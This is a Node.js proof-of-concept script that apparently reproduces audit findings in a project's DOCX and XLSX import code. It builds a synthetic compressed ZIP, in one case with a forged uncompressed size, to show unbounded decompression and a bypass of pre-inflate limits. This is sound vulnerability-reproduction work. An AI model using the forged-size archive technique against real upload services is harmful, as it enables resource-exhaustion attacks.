const fs=require('fs'), path=require('path'), vm=require('vm'), assert=require('assert/strict');
const ts=require('typescript'), zlib=require('zlib');
const root=process.cwd();
const observations=[];
function load(file) {
 const source=ts.transpileModule(fs.readFileSync(path.join(root,file),'utf8'),{compilerOptions:{module:ts.ModuleKind.CommonJS,target:ts.ScriptTarget.ES2022}}).outputText;
 const module={exports:{}};
 const wrapped={...zlib,inflateRawSync:(input,options)=>{
  const output=zlib.inflateRawSync(input,options); observations.push({compressedBytes:input.length,expandedBytes:output.length,maxOutputLength:options?.maxOutputLength??null}); return output;
 }};
 vm.runInNewContext('(function(require,module,exports){'+source+'\n})',{Buffer,console,TextDecoder,TextEncoder})(id=>id==='zlib'?wrapped:require(id),module,module.exports);
 return module.exports;
}
function syntheticZip(forged=false) {
 const name=Buffer.from('word/document.xml'), body=Buffer.from('<w:document><w:p>'+'A'.repeat(2*1024*1024)+'</w:p></w:document>');
 const compressed=zlib.deflateRawSync(body,{level:9});
 const local=Buffer.alloc(30); local.writeUInt32LE(0x04034b50); local.writeUInt16LE(20,4); local.writeUInt16LE(8,8); local.writeUInt32LE(compressed.length,18); local.writeUInt32LE(body.length,22); local.writeUInt16LE(name.length,26);
 const central=Buffer.alloc(46); central.writeUInt32LE(0x02014b50); central.writeUInt16LE(20,6); central.writeUInt16LE(8,10); central.writeUInt32LE(compressed.length,20); central.writeUInt32LE(forged?1:body.length,24); central.writeUInt16LE(name.length,28);
 const end=Buffer.alloc(22); end.writeUInt32LE(0x06054b50); end.writeUInt16LE(1,8); end.writeUInt16LE(1,10); end.writeUInt32LE(central.length+name.length,12); end.writeUInt32LE(local.length+name.length+compressed.length,16);
 return Buffer.concat([local,name,compressed,central,name,end]);
}
const documents=load('lib/imports/document-text.ts');
const docx=syntheticZip();
assert.equal(documents.extractDocxText(docx).length,2*1024*1024);
console.log(JSON.stringify({test:'docx_unbounded_decompression',fixtureBytes:docx.length,observations:[...observations],result:'REPRODUCED',syntheticOnly:true,maximumExpandedBytes:2*1024*1024+40}));
observations.length=0;
const spreadsheets=load('lib/imports/spreadsheets.ts');
const xlsx=syntheticZip(true);
let message='';
try {spreadsheets.parseSpreadsheetWorkbook({fileName:'synthetic.xlsx',buffer:xlsx});} catch(e){message=e.message;}
assert.equal(observations[0].expandedBytes,2*1024*1024+36);
assert.match(message,/incomplete file entry/);
console.log(JSON.stringify({test:'xlsx_forged_uncompressed_size_bypasses_preinflate_limits',fixtureBytes:xlsx.length,declaredExpandedBytes:1,observations,errorAfterExpansion:message,result:'REPRODUCED',syntheticOnly:true}));
